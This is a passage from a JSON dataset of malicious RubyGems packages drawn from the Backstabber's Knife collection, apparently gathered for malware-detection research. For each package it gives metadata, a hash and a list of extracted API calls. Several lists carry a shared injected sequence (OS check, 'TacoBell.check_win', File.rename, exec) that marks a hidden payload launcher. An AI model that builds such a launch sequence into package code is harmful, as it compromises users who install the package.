'@client.request_challenge_validation', '\"dns-01\".freeze', '\"_acme-challenge\".freeze', '\"TXT\".freeze', 'Acme::Client::Util.urlsafe_base64', 'DIGEST.digest', 'key_authorization', '\"http-01\".freeze', '\"text/plain\".freeze', 'key_authorization', 'token', 'directory.fetch', 'directory', 'raise', 'meta.[]', 'meta', 'DIRECTORY_META.[]', 'meta.[]', 'meta', 'DIRECTORY_META.[]', 'meta.[]', 'meta', 'DIRECTORY_META.[]', 'meta.[]', 'meta', 'DIRECTORY_META.[]', 'directory.[]', 'directory', 'private', 'load_directory', 'fetch_directory', 'result.[]=', 'body.delete', 'DIRECTORY_RESOURCES.each', 'body.[]', 'result.[]=', 'URI', 'body.[]', 'raise', 'exception.inspect', 'Faraday.new', 'connection.headers.[]=', 'connection.headers', 'connection.get', 'JSON.parse', 'response.body', 'attr_reader', 'assign_attributes', 'assign_attributes', '@client.order({ url: url }).to_h', '@client.order', 'url', '@authorization_urls.map', '@client.authorization', 'assign_attributes', '@client.finalize({ url: finalize_url, csr: csr }).to_h', '@client.finalize', 'finalize_url', 'certificate_url', '@client.certificate', 'certificate_url', 'raise', 'url', 'status', 'expires', 'finalize_url', 'authorization_urls', 'identifiers', 'certificate_url', 'private', 'attr_reader', 'extend', 'def_delegators', 'default_not_before', 'default_not_after', 'generate_private_key', 'generate_certificate', 'generate_extension_factory', 'subject_alt_names.map { |d,|\\n  \"DNS: #{d}\"\\n}.join', 'subject_alt_names.map', 'subject_alt_names', 'extension_factory.create_extension', 'certificate.add_extension', 'certificate.sign', 'private_key', 'digest', 'private', 'OpenSSL::PKey::RSA.new', 'Time.now.-', 'Time.now', 'Time.now.+', 'Time.now', '30 * 24.*', '30.*', 'OpenSSL::Digest::SHA256.new', 'OpenSSL::X509::Certificate.new', 'certificate.not_before=', 'not_before', 'certificate.not_after=', 'not_after', 'Acme::Client::Util.set_public_key', 'private_key', 'certificate.version=', 'certificate.serial=', 'OpenSSL::X509::ExtensionFactory.new', 'extension_factory.subject_certificate=', 'extension_factory.issuer_certificate=', 'Base64.urlsafe_encode64(data).sub', 'Base64.urlsafe_encode64', 'obj.public_key=', 'obj.public_key=', 'priv.public_key', 'raise', 'extend', '\"2.0.5\".freeze']",
            "n_tokens": 3773,
            "embedding": "[ 0.01727747 -0.01257978 -0.01031449 ...  0.00581177 -0.01635836\n  0.00730184]",
            "cluster": "0",
            "id": 261,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/acme_client/2.0.5/acme_client-2.0.5.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/acme_client/2.0.5/acme_client-2.0.5_extracted",
            "name": "acme_client",
            "version": "2.0.5",
            "published_at": "2020-02-16T01:56:56.891Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, rspec, vcr, webmock, faraday",
            "SHA-256": "924962c02ffa585fe2c42d686f6a5ae9d5a126e9982dec10d08d5bd1da33b1ef"
        },
        {
            "name_version": "active_profiling-0.1.1",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/active_profiling/0.1.1/active_profiling-0.1.1_extracted/active_profiling-0.1.1_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'GC.respond_to?', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'extend', 'included', 'include', 'include', 'ActionController::Base.respond_to?', 'send', 'proc', 'Rails.application.config.active_profiling.profiler.enabled', 'Rails.application.config.active_profiling.profiler', 'Rails.application.config.active_profiling', 'Rails.application.config', 'Rails.application', 'ActiveProfiling.ruby_prof?', 'send', 'proc', 'Rails.application.config.active_profiling.gc_statistics.enabled', 'Rails.application.config.active_profiling.gc_statistics', 'Rails.application.config.active_profiling', 'Rails.application.config', 'Rails.application', 'ActiveProfiling.gc_statistics?', 'ruby_profiler', 'controller_name', 'action_name', 'gc_statistics', 'include', 'logger', 'logger.send', 'logger', 'config.profiler.log_level', 'config.profiler', 'config', 'self.indent', 'event.payload.[]', 'event.payload', 'event.payload.[]', 'event.payload', 'logger.send', 'logger', 'config.profiler.log_level', 'config.profiler', 'config', 'color', 'logger', 'logger.send', 'logger', 'config.profiler.log_level', 'config.profiler', 'config', 'logger.send', 'logger', 'config.profiler.log_level', 'config.profiler', 'config', 'color', 'event.payload.[]', 'event.payload', 'logger', 'logger.send', 'logger', 'config.gc_statistics.log_level', 'config.gc_statistics', 'config', 'event.payload.[](:report).blank?', 'event.payload.[]', 'event.payload', 'event.payload.[]', 'event.payload', 'self.indent', 'event.payload.[]', 'event.payload', 'logger.send', 'logger', 'config.gc_statistics.log_level', 'config.gc_statistics', 'config', 'color', '::Rails.logger', 'protected', 'Rails.application.config.active_profiling', 'Rails.application.config', 'Rails.application', 'text.split(\"\\\\n\").collect { |line,|\\n  \"  #{line}\"\\n}.join', 'text.split(\"\\\\n\").collect', 'text.split', 'ActiveProfiling::ActionController::LogSubscriber.attach_to', 'require', 'config.log_level', 'config', 'logger', 'logger.send', 'logger', 'config.log_level', 'config', 'event.payload', '\"SCHEMA\".==', 'payload.[]', 'event.send(:caller).collect { |line,|\\n  if line_match(line)\\n    \"    #{line}\"\\n  end\\n}.compact', 'event.send(:caller).collect', 'event.send', 'line_match', 'backtrace.empty?', 'color', 'payload.[]', 'logger.send', 'logger', 'config.log_level', 'config', 'backtrace.join', '::ActiveRecord::Base.logger', 'protected', 'Rails.application.config.active_profiling.active_record.backtrace_logger', 'Rails.application.config.active_profiling.active_record', 'Rails.application.config.active_profiling', 'Rails.application.config', 'Rails.application', 'config.enabled', 'config', 'config.verbose', 'config', '!(line =~ config.matcher).!', '(line =~ config.matcher)\\n.!', 'line.=~', 'config.matcher', 'config', 'ActiveProfiling::ActiveRecord::BacktraceLogSubscriber.attach_to', 'extend', '{ disable_gc: false }.merge', 'options.[]', 'GC.disable', 'GC::Profiler.enable', 'GC::Profiler.clear', 'options.[]', 'GC.enable', 'GC::Profiler.result', 'options.[]', 'GC.enable', 'GC::Profiler.disable', 'GC::Profiler.clear', 'GC.respond_to?', '{ disable_gc: false }.merge', 'options.[]', 'GC.disable', 'GC.enable_stats', 'GC.clear_stats', '[\"Allocated size: #{GC.allocated_size}\", \"Number of allocations: #{GC.num_allocations}\", \"Collections: #{GC.collections}\", \"Time (ms): #{GC.time / 1000.0}\"].join', 'GC.allocated_size', 'GC.num_allocations', 'GC.collections', 'GC.time./', 'GC.time', 'options.[]', 'GC.enable', 'GC.disable_stats', 'GC.clear_stats', '$stderr.puts', 'private', 'Rails.application.config.active_profiling.gc_statistics.merge', 'Rails.application.config.active_profiling.gc_statistics', 'Rails.application.config.active_profiling', 'Rails.application.config', 'Rails.application', 'args.extract_options!', 'gc_statistics_report', 'ActiveSupport::Notifications.instrument', 'options.[]', 'args.first', 'self.extend', '{ enabled: false, measure_mode: :process_time, disable_gc: true, printer: :graph, call_tree_prefix: \"callgrind.out.\", output: nil, log_level: :info, printer_options: { min_percent: 1, print_file: true } }.freeze', '{ enabled: false, disable_gc: false, log_level: :info }.freeze', '{ enabled: false, verbose: false, log_level: :debug }.freeze', 'config.active_profiling=', 'config', 'ActiveSupport::OrderedOptions.new', 'config.active_profiling.profiler=', 'config.active_profiling', 'config', 'ActiveSupport::OrderedOptions.new', 'config.active_profiling.gc_statistics=', 'config.active_profiling', 'config', 'ActiveSupport::OrderedOptions.new', 'config.active_profiling.active_record=', 'config.active_profiling', 'config', 'ActiveSupport::OrderedOptions.new', 'config.active_profiling.active_record.backtrace_logger=', 'config.active_profiling.active_record', 'config.active_profiling', 'config', 'ActiveSupport::OrderedOptions.new', 'initializer', 'app.config.active_profiling', 'app.config', 'options.profiler.reverse_merge!', 'options.profiler', 'options.gc_statistics.reverse_merge!', 'options.gc_statistics', 'options.active_record.backtrace_logger.reverse_merge!', 'options.active_record.backtrace_logger', 'options.active_record', 'options.active_record.backtrace_logger.[]', 'options.active_record.backtrace_logger', 'options.active_record', 'Rails.root', 'require', 'extend', 'Output.new(*args).run', 'Output.new', 'self.extend', 'Rails.application.config.active_profiling.profiler.merge', 'Rails.application.config.active_profiling.profiler', 'Rails.application.config.active_profiling', 'Rails.application.config', 'Rails.application', 'args.extract_options!', 'args.first', '@options.[]', '@options.[]', '@options.[]', '@output.==', 'ActiveProfiling::ActionController::LogSubscriber.logger.!', 'ActiveProfiling::ActionController::LogSubscriber.logger', 'RubyProf.measure_mode=', 'RubyProf.const_get', '@options.[](:measure_mode).to_s.upcase', '@options.[](:measure_mode).to_s', '@options.[]', '@options.[]', 'GC.disable', 'RubyProf.profile', 'write_to_stdout', 'write_to_log', 'write_to_file_or_path', 'raise', '@options.[]', 'GC.enable', 'private', '@options.[]', 'RubyProf.const_get', '@options.[](:printer).to_s.camelize', '@options.[](:printer).to_s', '@options.[]', '@path.present?', 'File.dirname', '@options.[]', 'File.dirname', 'options.[]', 'options', '@options.[]', 'Time.now.strftime', 'Time.now', 'Digest::MD5.hexdigest(rand.to_s).[]', 'Digest::MD5.hexdigest', 'rand.to_s', 'rand', 'Rails.root.join', 'Rails.root', '@options.[]', '[@options.[](:name), @options.[](:measure_mode), @options.[](:printer), time, hash, ext].join', '@options.[]', '@options.[]', '@options.[]', 'path.to_s', 'path.join', 'printer_class.new(@profiler_result).print', 'printer_class.new', 'printer_class', 'StringIO.new', 'printer_class.new(@profiler_result).print', 'printer_class.new', 'printer_class', '@options.[]', 'str.rewind', 'ActiveSupport::Notifications.instrument', 'str.read', '@options.[]', 'call_tree_printer_file_output?', 'write_to_path', 'write_to_file', 'ActiveSupport::Notifications.instrument', 'path_and_file_name.[]', 'path_and_file_name', 'FileUtils.mkdir_p', 'path_and_file_name.[]', 'path_and_file_name', 'printer_class.new(@profiler_result).print', 'printer_class.new', 'printer_class', 'File.open', 'path_and_file_name.[]', 'path_and_file_name', '@options.[]', 'ActiveSupport::Notifications.instrument', 'path_and_file_name.[]', 'path_and_file_name', 'FileUtils.mkdir_p', 'path_and_file_name.[]', 'path_and_file_name', 'printer_class.new(@profiler_result).print', 'printer_class.new', 'printer_class', 'merged_printer_options', 'path_and_file_name', 'call_tree_printer_file_output?', '@options.[](:call_tree_prefix).try', '@options.[]', '@options.[]', '@options.[](:printer).==', '@options.[]', '@output.==', '@options.[](:printer_options).merge', '@options.[]', 'call_tree_prefix_option', 'path_and_file_name.[]', '@options.[]', 'printer_class.instance_method(:print).arity.==', 'printer_class.instance_method(:print).arity', 'printer_class.instance_method', 'printer_class', 'printer_class.==', 'printer_class', '\"0.1.1\".freeze']",
            "n_tokens": 2071,
            "embedding": "[ 0.00229819 -0.01314071 -0.01480952 ... -0.00421256 -0.02237163\n -0.00051823]",
            "cluster": "0",
            "id": 220,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/active_profiling/0.1.1/active_profiling-0.1.1.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/active_profiling/0.1.1/active_profiling-0.1.1_extracted",
            "name": "active_profiling",
            "version": "0.1.1",
            "published_at": "2020-02-16T02:05:30.046Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "rails",
            "SHA-256": "856b8e72cfdb15e021a16faf74741dcffe4f8b6534e112ad0d6ffff7a3e68906"
        },
        {
            "name_version": "active-publisher-1.2.0",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/active-publisher/1.2.0/active-publisher-1.2.0_extracted/active-publisher-1.2.0_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', '::RUBY_PLATFORM.==', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', '::ActivePublisher::Configuration.new', 'block_given?', 'configuration', 'with_exchange', '::ActiveSupport::Notifications.instrument', 'exchange.publish', 'publishing_options', 'with_exchange', 'loop', 'messages.empty?', 'messages.shift', 'message.is_a?', 'fail', 'message.exchange_name.!=', 'message.exchange_name', 'fail', '::ActiveSupport::Notifications.instrument', 'exchange.publish', 'message.payload', 'publishing_options', 'message.route', 'message.options', 'messages.<<', 'raise', '{ mandatory: false, persistent: false, routing_key: route }.merge', '::RUBY_PLATFORM.==', 'java_options.[]=', 'options.delete', 'java_options.[]=', 'options.delete', 'java_options.[]=', '::ActivePublisher::Connection.connection', 'connection.create_channel', 'configuration.publisher_confirms', 'configuration', 'channel.confirm_select', 'channel.topic', 'configuration.publisher_confirms', 'configuration', 'channel.wait_for_confirms', 'channel.close', '::ActiveSupport.run_load_hooks', 'at_exit', '::ActivePublisher::Async.publisher_adapter', '::ActivePublisher::Async.publisher_adapter.shutdown!', '::ActivePublisher::Async.publisher_adapter', '::ActivePublisher::Connection.disconnect!', '::ActivePublisher::Async.publisher_adapter.publish', '::ActivePublisher::Async.publisher_adapter', 'attr_accessor', 'require', 'require', 'require', 'require', 'require', 'require', '::ActivePublisher::Async::InMemoryAdapter::Adapter.new', 'include', 'attr_reader', 'logger.info', 'logger', '::ActivePublisher::Async::InMemoryAdapter::AsyncQueue.new', '::ActivePublisher::Message.new', 'async_queue.push', 'async_queue', '::ActivePublisher.configuration.seconds_to_wait_for_graceful_shutdown', '::ActivePublisher.configuration', '::Time.now', 'logger.info', 'logger', 'async_queue.size', 'async_queue', 'async_queue.size.>', 'async_queue.size', 'async_queue', '(::Time.now - started_shutting_down_at)\\n.>', '::Time.now.-', '::Time.now', 'logger.info', 'logger', 'async_queue.size', 'async_queue', 'sleep', '[:raise, :drop, :wait].freeze', 'include', 'attr_accessor', 'attr_reader', 'self.back_pressure_strategy=', '::MultiOpQueue::Queue.new', 'create_and_supervise_consumer!', 'BACK_PRESSURE_STRATEGIES.include?', 'fail', 'queue.size.>=', 'queue.size', 'queue', 'max_queue_size', 'back_pressure_strategy', '::ActiveSupport::Notifications.instrument', '::ActiveSupport::Notifications.instrument', 'fail', '::ActiveSupport::Notifications.instrument', 'queue.size.<', 'queue.size', 'queue', 'max_queue_size', 'sleep', 'queue.push', 'queue', 'consumer.nil?', 'consumer', 'queue.size', 'queue', '[queue.size, consumer.sampled_queue_size].max', 'queue.size', 'queue', 'consumer.sampled_queue_size', 'consumer', 'private', '::ActivePublisher::Async::InMemoryAdapter::ConsumerThread.new', 'queue', '::Concurrent::TimerTask.new', 'supervisor_interval', '::Time.now', 'current_time.-', 'consumer.last_tick_at', 'consumer', 'seconds_since_last_tick.>', '::ActivePublisher.configuration.max_async_publisher_lag_time', '::ActivePublisher.configuration', 'logger.error', 'logger', 'consumer.alive?.!', 'consumer.alive?', 'consumer', 'consumer.kill', 'consumer', '::ActivePublisher::Async::InMemoryAdapter::ConsumerThread.new', 'queue', '::ActiveSupport::Notifications.instrument', 'queue.size', 'queue', 'supervisor_task.execute', 'attr_reader', '::ActivePublisher::Connection.connection.create_channel', '::ActivePublisher::Connection.connection', 'rabbit_channel.close', 'rabbit_channel', 'rabbit_channel.confirm_select', 'rabbit_channel', 'topic_exchange_cache.[]', 'topic_exchange_cache', 'rabbit_channel.topic', 'rabbit_channel', 'rabbit_channel.using_publisher_confirms?', 'rabbit_channel', 'rabbit_channel.method(:wait_for_confirms).arity.>', 'rabbit_channel.method(:wait_for_confirms).arity', 'rabbit_channel.method', 'rabbit_channel', 'rabbit_channel.wait_for_confirms', 'rabbit_channel', 'rabbit_channel.wait_for_confirms', 'rabbit_channel', 'attr_reader', '::RUBY_PLATFORM.==', '[::MarchHare::NetworkException, ::MarchHare::ConnectionRefused, ::Java::ComRabbitmqClient::AlreadyClosedException, ::Java::JavaIo::IOException].freeze', '[::Bunny::NetworkFailure, ::Bunny::TCPConnectionFailed, ::Bunny::ConnectionTimeout, ::Timeout::Error, ::IOError].freeze', '::RUBY_PLATFORM.==', 'queue.size', 'queue', 'update_last_tick_at', 'start_thread', '@thread.alive?', '@thread.kill', 'private', 'sleep', 'sleep', '::ActivePublisher::Async::InMemoryAdapter::Channel.new', '::ActivePublisher.configuration.publisher_confirms', '::ActivePublisher.configuration', 'channel.confirm_select', '::Time.now', 'alive?', '::Thread.new', 'loop', 'queue.size', 'queue', 'queue.pop_up_to', 'queue', 'update_last_tick_at', 'current_messages.nil?', 'current_messages.select!', 'message.is_a?', 'make_channel', 'current_messages.group_by(&:exchange_name).each', 'current_messages.group_by', 'publish_all', 'await_network_reconnect', '::ActivePublisher.configuration.error_handler.call', '::ActivePublisher.configuration.error_handler', '::ActivePublisher.configuration', 'current_messages.size', 'current_messages.each', '::ActivePublisher.publish', 'message.route', 'message.payload', 'message.exchange_name', 'message.options', 'current_messages.delete', '::ActivePublisher.configuration.error_handler.call', '::ActivePublisher.configuration.error_handler', '::ActivePublisher.configuration', 'current_messages.delete', '::ActivePublisher.configuration.error_handler.call', '::ActivePublisher.configuration.error_handler', '::ActivePublisher.configuration', 'message.route', 'message.payload', 'message.exchange_name', 'message.options', 'raise', 'current_messages.empty?.!', 'current_messages.empty?', 'queue.concat', 'queue', '::ActiveSupport::Notifications.instrument', 'messages.size', 'channel.topic', 'messages.each', 'message.exchange_name.!=', 'message.exchange_name', 'fail', '::ActivePublisher.publishing_options', 'message.route', 'message.options', 'exchange.publish', 'message.payload', 'wait_for_confirms', 'channel.using_publisher_confirms?', 'channel.wait_for_confirms', '::ActivePublisher.configuration.publisher_confirms_timeout', '::ActivePublisher.configuration', 'require', 'require', 'require', 'require', '\"ACTIVE_PUBLISHER_LIST\".freeze', '::ActivePublisher::Async::RedisAdapter::Adapter.new', 'include', 'attr_reader', 'logger.info', 'logger', '::ActivePublisher::Async::RedisAdapter::Consumer.new', 'redis_pool', '::MultiOpQueue::Queue.new', '::Concurrent::TimerTask.new', 'queue.size', 'queue', '[queue_size / 50, 1].max', 'queue_size./', '[number_of_times, 5].min', 'number_of_times.times', 'flush_queue!', 'supervisor_task.execute', '::ActivePublisher::Message.new', 'queue.<<', 'queue', '::Marshal.dump', 'queue.size.>=', 'queue.size', 'queue', 'options.[]', 'flush_queue!', 'logger.info', 'logger', 'queue.empty?', 'queue', 'flush_queue!', 'sleep', 'private', 'queue.empty?', 'queue', 'queue.pop_up_to', 'queue', 'encoded_messages.nil?', 'encoded_messages.respond_to?', 'encoded_messages.size.>', 'encoded_messages.size', 'redis_pool.with', 'redis_pool', 'redis.rpush', 'require', 'attr_reader', '::ActivePublisher::Async::RedisAdapter::RedisMultiPopQueue.new', 'create_and_supervise_consumer!', '::ActivePublisher::Async::InMemoryAdapter::ConsumerThread.new', 'queue', '::Concurrent::TimerTask.new', 'consumer.alive?', 'consumer', 'consumer.kill', 'consumer', '::ActivePublisher::Async::InMemoryAdapter::ConsumerThread.new', 'queue', '::ActiveSupport::Notifications.instrument', 'queue.size', 'queue', 'supervisor_task.execute', 'queue.size', 'queue', 'attr_reader', '::Marshal.dump', 'redis_pool.with', 'redis_pool', 'redis.rpush', 'list_key', 'messages.flatten', 'messages.compact!', 'messages.empty?', 'messages.each', 'encoded_messages.<<', '::Marshal.dump', 'redis_pool.with', 'redis_pool', 'redis.rpush', 'list_key', 'size.<=', 'size', 'opts.fetch', 'opts.fetch', 'size', 'queue_size.<=', 'raise', 'loop', 'sleep', 'size', 'queue_size.>', '[num_to_pop, queue_size].min', 'shift', 'total_waited_time.>', 'shift', '[number, size].min', 'size', 'number.<=', 'redis_pool.with', 'redis_pool', 'redis.multi', 'redis.lrange', 'list_key', 'number.-', 'redis.ltrim', 'list_key', 'multi_response.first', 'multi_response.last', 'multi_response.size.!=', 'multi_response.size', 'success.nil?', 'success.=~', 'messages.nil?', 'messages.respond_to?', 'messages.each', 'message.nil?', 'shifted_messages.<<', '::Marshal.load', 'redis_pool.with', 'redis_pool', 'redis.llen', 'list_key', 'require', 'require', 'attr_accessor', '::Mutex.new', '1.freeze', 'lambda', '::ActivePublisher::Logging.logger.error', '::ActivePublisher::Logging.logger', 'error.class', '::ActivePublisher::Logging.logger.error', '::ActivePublisher::Logging.logger', 'error.message', 'error.backtrace.respond_to?', 'error.backtrace', '::ActivePublisher::Logging.logger.error', '::ActivePublisher::Logging.logger', 'error.backtrace.join', 'error.backtrace', 'CONFIGURATION_MUTEX.synchronize', 'ENV.[]', 'ENV.[]', 'ENV.[]', 'attempt_to_load_yaml_file', 'DEFAULTS.each_pair', 'cli_options.[]', 'cli_options.[]', 'key.to_s', 'yaml_config.[]', 'yaml_config.[]', 'key.to_s', '::ActivePublisher.configuration.public_send', '::ActivePublisher.configuration', '::File.expand_path', '::File.join', '::File.expand_path', '::File.join', '::File.exists?', '::YAML.load(::ERB.new(::File.read(absolute_config_path)).result).[]', '::YAML.load', '::ERB.new(::File.read(absolute_config_path)).result', '::ERB.new', '::File.read', '::File.exists?', '::YAML.load(::ERB.new(::File.read(action_subscriber_config_file)).result).[]', '::YAML.load', '::ERB.new(::File.read(action_subscriber_config_file)).result', '::ERB.new', '::File.read', 'private_class_method', 'DEFAULTS.each_pair', 'self.__send__', '::ActionSubscriber::URI.parse_amqp_url', 'settings.each', 'send', '@hosts.size.>', '@hosts.size', 'host', 'require', '::Mutex.new', 'connection.try', 'connection', 'CONNECTION_MUTEX.synchronize', 'create_connection', 'CONNECTION_MUTEX.synchronize', '@connection.connected?', '@connection.close', '::RUBY_PLATFORM.==', '::MarchHare.connect', 'connection_options', '::Bunny.new', 'connection_options', 'connection.start', 'private_class_method', '::ActivePublisher.configuration.timeout.*', '::ActivePublisher.configuration.timeout', '::ActivePublisher.configuration', '::ActivePublisher.configuration.heartbeat', '::ActivePublisher.configuration', '::ActivePublisher.configuration.hosts', '::ActivePublisher.configuration', '::ActivePublisher.configuration.network_recovery_interval', '::ActivePublisher.configuration', '::ActivePublisher.configuration.password', '::ActivePublisher.configuration', '::ActivePublisher.configuration.port', '::ActivePublisher.configuration', '::ActivePublisher.configuration.tls', '::ActivePublisher.configuration', '::ActivePublisher.configuration.tls_ca_certificates', '::ActivePublisher.configuration', '::ActivePublisher.configuration.tls_cert', '::ActivePublisher.configuration', '::ActivePublisher.configuration.tls_key', '::ActivePublisher.configuration', '::ActivePublisher.configuration.username', '::ActivePublisher.configuration', '::ActivePublisher.configuration.verify_peer', '::ActivePublisher.configuration', 'private_class_method', 'require', 'require', 'Logger.new', '@logger.level=', '$TESTING.!', 'oldlogger.close', 'initialize_logger', 'Logger.new', '::ActivePublisher::Logging.logger', 'Struct.new']",
            "n_tokens": 2681,
            "embedding": "[ 0.00443885 -0.00377724 -0.00665358 ... -0.00498315 -0.01524036\n  0.00264173]",
            "cluster": "0",
            "id": 413,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/active-publisher/1.2.0/active-publisher-1.2.0.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/active-publisher/1.2.0/active-publisher-1.2.0_extracted",
            "name": "active-publisher",
            "version": "1.2.0",
            "published_at": "2020-02-16T02:31:16.734Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "benchmark-ips, bundler, connection_pool, fakeredis, pry, rake, rspec, bunny, activesupport, concurrent-ruby, multi_op_queue",
            "SHA-256": "9dfe5dfdb16774fdce59fd9a5ead07aecbe22b2bd04ccc983e25262c2d358a08"
        },
        {
            "name_version": "activeadmin_mongoid-localize-1.0.1",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/activeadmin_mongoid-localize/1.0.1/activeadmin_mongoid-localize-1.0.1_extracted/activeadmin_mongoid-localize-1.0.1_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'autoload', 'attr_writer', 'I18n.available_locales', 'form_buffers.last.<<', 'form_buffers.last', 'form_buffers', 'self.form_buffers.last', 'self.form_buffers', 'builder_method', 'ActiveAdmin::Mongoid::Localize.locales', '_locales.each_with_index', '@table.<<', 'tr', 'index.==', 'th', '_locales.length', 'header_content_for', 'td', 'I18n.with_locale', '(image_tag(\"aml/flags/#{locale.to_s}.png\", { alt: locale.to_s, title: locale.to_s }) + \" \" + content_for(block || attr))\\n.html_safe', 'image_tag(\"aml/flags/#{locale.to_s}.png\", { alt: locale.to_s, title: locale.to_s }) + \" \".+', 'image_tag(\"aml/flags/#{locale.to_s}.png\", { alt: locale.to_s, title: locale.to_s }).+', 'image_tag', 'locale.to_s', 'locale.to_s', 'locale.to_s', 'content_for', 'protected', 'ActiveAdmin::Mongoid::Localize.locales.each', 'ActiveAdmin::Mongoid::Localize.locales', 'I18n.with_locale', 'resource_class.human_attribute_name(attr).+', 'resource_class.human_attribute_name', 'resource_class', 'column', 'resource.send', 'extend', 'locale.to_s.gsub', 'locale.to_s', 'obj.class', '@@validators.[]=', '@obj.class.validators_on', '@obj.class', 'name.to_sym', '@@validators.[](@field).map(&:class).map(&:name).include?', '@@validators.[](@field).map(&:class).map', '@@validators.[](@field).map', '@@validators.[]', 'ActiveModel::Errors.new', '@obj.send', '::ActiveAdmin::Mongoid::Localize.locales.each', '::ActiveAdmin::Mongoid::Localize.locales', 'clean_locale', 'self.class.send', 'self.class', 'proc', 'self.instance_variable_get', 'self.class.send', 'self.class', 'proc', 'self.instance_variable_set', 'self.instance_variable_set', 'hash.each', 'k.to_s.gsub', 'k.to_s', 'self.instance_variable_set', 'validate!', '@obj.errors.any?', '@obj.errors', 'validate!', '::ActiveAdmin::Mongoid::Localize.locales.each', '::ActiveAdmin::Mongoid::Localize.locales', 'send(k).blank?', 'send', '@errors.add', 'I18n.t', '@obj.fields.[]', '@obj.fields', '@obj.send', '@obj.respond_to?', '@@validators.[](attributized_method_name).nil?', '@@validators.[]', '@@validators.[]', '@@model.send', 'self.object.send', 'self.object', 'ActiveAdmin::Mongoid::Localize::Field.new', 'self.object', 'self.semantic_fields_for', '::ActiveAdmin::Mongoid::Localize.locales.each', '::ActiveAdmin::Mongoid::Localize.locales', 'args.[]=', 't.nil?', 't.[](locale.to_s).nil?', 't.[]', 'locale.to_s', 't.[]', 'locale.to_s', 'locale.to_s.include?', 'locale.to_s', 'locale.to_s.split(\"-\").[](1).downcase', 'locale.to_s.split(\"-\").[]', 'locale.to_s.split', 'locale.to_s', 'locale.to_s', 'flag_code.==', 'CGI.escapeHTML(self.object.class.human_attribute_name(name)).+', 'CGI.escapeHTML', 'self.object.class.human_attribute_name', 'self.object.class', 'self.object', 'template.image_tag', 'template', 'locale.to_s', 'locale.to_s', 'args.[](:as).==', 'args.[]', '\"<h3 style=\\'margin: 10px 0px 0px 10px;\\'>#{label}</h3>#{if field.required?\\n  \"<abbr>*</abbr>\"\\nend}\".html_safe', 'field.required?', 'args.[]=', '\"\".html_safe', 'args.[]=', 'label.html_safe', 'args.[]=', 'field.required?', 'ret.<<', 'prepend.+', 'lf.input', 'ret.html_safe']",
            "n_tokens": 966,
            "embedding": "[ 0.00683371  0.0007534  -0.00887142 ...  0.00439037 -0.00548797\n  0.01066097]",
            "cluster": "0",
            "id": 92,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/activeadmin_mongoid-localize/1.0.1/activeadmin_mongoid-localize-1.0.1.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/activeadmin_mongoid-localize/1.0.1/activeadmin_mongoid-localize-1.0.1_extracted",
            "name": "activeadmin_mongoid-localize",
            "version": "1.0.1",
            "published_at": "2020-02-16T02:44:43.268Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "mongoid, formtastic",
            "SHA-256": "1af3d4c3ebd9fa0faa92720af90de71b44b1f47279e1fc2551f5269ed8c2d627"
        },
        {
            "name_version": "adb_sdklib-0.0.3",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/adb_sdklib/0.0.3/adb_sdklib-0.0.3_extracted/adb_sdklib-0.0.3_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'devices.each', 'self.[]=', 'd.serial_number', 'block_given?', 'self.values.each', 'self.values', 'self.values.each', 'self.values', 'include', 'adb_location.nil?', '`which adb`.chomp!', 'raise', 'raise', 'load_sdk_tools_jar', 'Rjb.import', 'ddm.setLogLevel', 'at_exit', 'Adb.terminate', '@@adb.nil?', 'Rjb.import', '@@adb.initIfNeeded', '@@adb.createBridge', '10.times', '@adb.connected?', 'sleep', '@adb.connected?', 'raise', 'DeviceList.new', '@@adb.nil?', '@@adb.terminate', '@adb.devices.map', '@adb.devices', 'd.serial_number', '@devices.has_key?', 'same_jobject?', '@devices.[](serial).jobject', '@devices.[]', '@devices.[]', 'Device.new', 'DeviceList.new', 'private', 'File.expand_path', 'File.dirname', 'libs.each', 'File.exist?', 'raise', 'Rjb.add_jar', 'require', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'data.[]', 'offset + length.-', 'offset.+', '@output.<<', 'out.force_encoding', '@line_receiver.nil?', '@output.split', 